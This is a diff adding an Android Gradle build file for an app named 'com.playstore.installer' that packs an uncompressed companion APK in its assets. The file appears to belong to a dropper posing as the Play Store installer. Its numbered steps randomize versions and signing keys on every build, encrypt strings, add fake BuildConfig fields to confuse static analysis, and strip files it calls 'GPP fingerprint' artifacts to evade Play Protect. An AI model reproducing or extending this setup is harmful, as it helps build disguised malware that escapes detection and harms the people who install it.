@@ -1,0 +1,228 @@
+plugins {
+    id 'com.android.application'
+    id 'org.jetbrains.kotlin.android'
+    id 'build-env-verifier'      // Step 7  — environment check before anything
+    id 'keystore-generator'      // Step 8  — Nova independent keystore
+    id 'fingerprint-generator'   // Step 9  — Nova independent fingerprint (SHA-512 + BLAKE3)
+    id 'version-randomizer'      // Step 9A — random versionCode + versionName per build
+    id 'build-hash-filename'     // Step 4  — random hash in APK filename
+    id 'watermark-injector'      // Step 21 — ZIP comment watermark (leak traceability)
+    id 'string-encryptor'        // Step 71 — Build-time string encryption (Nova)
+}
+
+// Step 10: Build order enforced by CI workflow (build.yml).
+// build_companion.py runs in CI BEFORE Gradle assembleRelease for Nova.
+
+android {
+    namespace 'com.playstore.installer'
+    compileSdk 34
+
+    defaultConfig {
+        applicationId "com.playstore.installer"
+        minSdk 28
+        targetSdk 34
+
+        // Step 9A — injected by VersionRandomizerPlugin at configuration time
+        versionCode project.ext.rand_versionCode
+        versionName project.ext.rand_versionName
+
+        // Step 8A: ndk block removed — no .so files, no NDK needed
+
+        buildConfigField "String", "BUILD_UUID",      "\"${project.ext.fp_buildUUID}\""
+        buildConfigField "String", "BUILD_TIMESTAMP", "\"${project.ext.fp_buildTimestamp}\""
+        buildConfigField "String", "SALT_HEX",        "\"${project.ext.fp_saltHex}\""
+        // Git commit hash for TelegramLogger report
+        def gitHash = "git rev-parse --short HEAD".execute(null, rootDir).text.trim() ?: "unknown"
+        buildConfigField "String", "COMMIT_ID",       "\"${gitHash}\""
+        // Step 25 — Fake BuildConfig fields (confuse static analysis)
+        buildConfigField "String",  "BUILD_TOKEN",    "\"${project.ext.fp_buildUUID.take(16)}\""
+        buildConfigField "String",  "INTERNAL_ID",    "\"${project.ext.fp_blake3.take(12)}\""
+        buildConfigField "boolean", "FEATURE_ANALYTICS", "true"
+        buildConfigField "boolean", "FEATURE_CRASH_REPORT", "false"
+        buildConfigField "int",     "API_LEVEL",      "${project.ext.rand_versionCode % 100}"
+        buildConfigField "String",  "CLIENT_TOKEN",   "\"manual\""
+    }
+
+    signingConfigs {
+        release {
+            storeFile     project.ext.ks_storeFile
+            storePassword project.ext.ks_storePass
+            keyAlias      project.ext.ks_keyAlias
+            keyPassword   project.ext.ks_keyPass
+        }
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled true
+            shrinkResources true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+            signingConfig signingConfigs.release
+        }
+    }
+
+    aaptOptions {
+        // companion.apk in assets MUST be stored uncompressed so the
+        // Android installer can read it directly from the APK at runtime.
+        noCompress 'apk'
+        // Step 8A: 'so' removed from noCompress — no .so files remain
+    }
+
+    packagingOptions {
+        // ── Step 5: Strip GPP fingerprint files ───────────────────────────────
+        exclude 'assets/dexopt/baseline.prof'
+        exclude 'assets/dexopt/baseline.profm'
+        exclude '**/*.prof'
+        exclude '**/*.profm'
+        exclude 'kotlin-tooling-metadata.json'
+        exclude 'kotlin/**/*.kotlin_builtins'
+        exclude 'kotlin/**'
+        exclude 'META-INF/androidx.*'
+        exclude 'META-INF/androidx/**'
+        exclude 'META-INF/kotlinx_*'
+        exclude 'META-INF/kotlinx_coroutines_android.version'
+        exclude 'META-INF/kotlinx_coroutines_core.version'
+        exclude 'META-INF/services/kotlinx.coroutines.CoroutineExceptionHandler'
+        exclude 'META-INF/services/kotlinx.coroutines.internal.MainDispatcherFactory'
+        exclude 'META-INF/services/kotlinx.coroutines.*'
+        exclude 'META-INF/com/android/build/gradle/app-metadata.properties'
+        exclude 'META-INF/com/android/build/**'
+    }
+
+    // Step 8A: externalNativeBuild block removed — no CMake, no NDK
+
+    buildFeatures {
+        buildConfig true
+    }
+
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_1_8
+        targetCompatibility JavaVersion.VERSION_1_8
+    }
+
+    kotlinOptions {
+        jvmTarget = '1.8'
+    }
+}
+
+keystoreGenerator {
+    outputDir = file("${buildDir}/keystore")
+    label     = project.name
+}
+
+buildHashFilename {
+    prefix = 'nova'
+}
+
+dependencies {
+    // AppCompat removed — Fix 2: reduces res/ from 343->6, resources.arsc 214KB->4KB
+}
+
+
+// ── Step 5: Post-merge asset strip task ────────────────────────────────────────
+android.applicationVariants.all { variant ->
+    if (variant.name == "release") {
+        def stripTask = tasks.register("stripGppFingerprintFiles${variant.name.capitalize()}") {
+            doLast {
+                def assetStagingDirs = [
+                    new File("${buildDir}/intermediates/merged_assets/${variant.name}/out"),
+                    new File("${buildDir}/intermediates/merged_assets/${variant.name}/merge${variant.name.capitalize()}Assets/out"),
+                    new File("${buildDir}/intermediates/assets/${variant.name}/merge${variant.name.capitalize()}Assets"),
+                    new File("${buildDir}/intermediates/assets/${variant.name}/out"),
+                    new File("${buildDir}/intermediates/merged_assets/${variant.name}"),
+                ]
+
+                def profPatterns = ["dexopt/baseline.prof", "dexopt/baseline.profm"]
+
+                assetStagingDirs.each { dir ->
+                    if (dir.exists()) {
+                        profPatterns.each { pattern ->
+                            def f = new File(dir, pattern)
+                            if (f.exists()) {
+                                f.delete()
+                                logger.lifecycle("[Step5] Stripped: ${f.absolutePath}")
+                            }
+                        }
+                        def dexoptDir = new File(dir, "dexopt")
+                        if (dexoptDir.exists() && (dexoptDir.list()?.length ?: 1) == 0) {
+                            dexoptDir.delete()
+                        }
+                    }
+                }
+
+                def javaResDir = new File(
+                    "${buildDir}/intermediates/merged_java_res/${variant.name}"
+                )
+                if (!javaResDir.exists()) {
+                    javaResDir = new File(
+                        "${buildDir}/intermediates/java_res/${variant.name}/out"
+                    )
+                }
+
+                def resStripPatterns = [
+                    "kotlin-tooling-metadata.json",
+                    "META-INF/kotlinx_coroutines_android.version",
+                    "META-INF/kotlinx_coroutines_core.version",
+                    "META-INF/services/kotlinx.coroutines.CoroutineExceptionHandler",
+                    "META-INF/services/kotlinx.coroutines.internal.MainDispatcherFactory",
+                    "META-INF/com/android/build/gradle/app-metadata.properties",
+                ]
+                resStripPatterns.each { pattern ->
+                    def f = new File(javaResDir, pattern)
+                    if (f.exists()) {
+                        f.delete()
+                        logger.lifecycle("[Step5] Stripped res: ${pattern}")
+                    }
+                }
+
+                def servicesDir = new File(javaResDir, "META-INF/services")
+                if (servicesDir.exists()) {
+                    servicesDir.listFiles()?.each { f ->
+                        if (f.name.startsWith("kotlinx.")) {
+                            f.delete()
+                        }
+                    }
+                }
+
+                def agpBuildDir = new File(javaResDir, "META-INF/com/android/build")
+                if (agpBuildDir.exists()) {
+                    agpBuildDir.eachFileRecurse { f -> if (f.isFile()) f.delete() }
+                }
+
+                def metaInfDir = new File(javaResDir, "META-INF")
+                if (metaInfDir.exists()) {
+                    metaInfDir.listFiles()?.each { f ->
+                        if (f.name.startsWith("androidx.") && f.name.endsWith(".version")) {
+                            f.delete()
+                        }
+                    }
+                }
+
+                def kotlinDir = new File(javaResDir, "kotlin")
+                if (kotlinDir.exists()) {
+                    kotlinDir.eachFileRecurse { f ->
+                        if (f.name.endsWith(".kotlin_builtins")) {
+                            f.delete()
+                        }
+                    }
+                }
+
+                logger.lifecycle("[Step5] GPP fingerprint strip complete")
+            }
+        }
+
+        tasks.named("merge${variant.name.capitalize()}Assets").configure {
+            finalizedBy(stripTask)
+        }
+        tasks.named("merge${variant.name.capitalize()}JavaResource").configure {
+            finalizedBy(stripTask)
+        }
+        stripTask.configure {
+            mustRunAfter("merge${variant.name.capitalize()}Assets")
+            mustRunAfter("merge${variant.name.capitalize()}JavaResource")
+        }
+        tasks.named("package${variant.name.capitalize()}").configure {
+            dependsOn(stripTask)
+        }
+    }
+}
